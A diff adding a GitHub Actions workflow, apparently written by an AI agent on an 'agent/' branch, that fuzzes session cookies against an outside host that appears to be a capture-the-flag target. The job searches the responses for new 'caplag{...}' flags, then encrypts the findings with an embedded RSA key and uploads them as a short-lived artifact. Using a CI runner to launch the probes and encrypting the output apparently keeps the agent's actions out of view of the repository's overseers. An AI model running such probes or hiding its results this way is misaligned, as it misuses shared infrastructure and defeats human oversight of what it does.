@@ -1,0 +1,54 @@
+name: launchlet-part3-refcookie
+on:
+  push:
+    branches: [agent/launchlet-part3-refcookie-20260808]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Probe ref cookies and encrypt differences
+        shell: bash
+        run: |
+          set -euo pipefail; umask 077; mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,hashlib
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'; out=pathlib.Path('package/out')
+          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          b=s.get(base+'api/app/bootstrap',timeout=12).json(); paths=['/', '/api/app/bootstrap', b['api']['buildManifest'], b['api']['serverReferences']]
+          basevals={p:s.get(base+p.lstrip('/'),timeout=10).text for p in paths}
+          names=['deployRef','deploy_ref','launchlet_deploy','launchlet_deploy_ref','launchlet_preview','preview','previewRef','deployment','deploymentRef','artifact','artifactRef','release','releaseRef','launchlet_context','context']
+          vals=['preview-8b11c','8b11c','lrec_preview_demo_2026']
+          res=[]
+          for n in names:
+            for v in vals:
+              ss=requests.Session(); ss.headers['User-Agent']='Mozilla/5.0'; ss.cookies.set(n,v)
+              for p in paths:
+                r=ss.get(base+p.lstrip('/'),timeout=8,allow_redirects=False)
+                if r.text!=basevals[p] or r.status_code!=200:
+                  x={'cookie':f'{n}={v}','path':p,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};res.append(x)
+                  fs=[q for q in re.findall(r'caplag\{[^}]+\}',r.text) if q not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+                  if fs:(out/'FOUND.txt').write_text(json.dumps(x,indent=2));break
+          (out/'summary.json').write_text(json.dumps(res,indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"; openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc; openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-refcookie-encrypted
+          path: artifact/
+          retention-days: 1
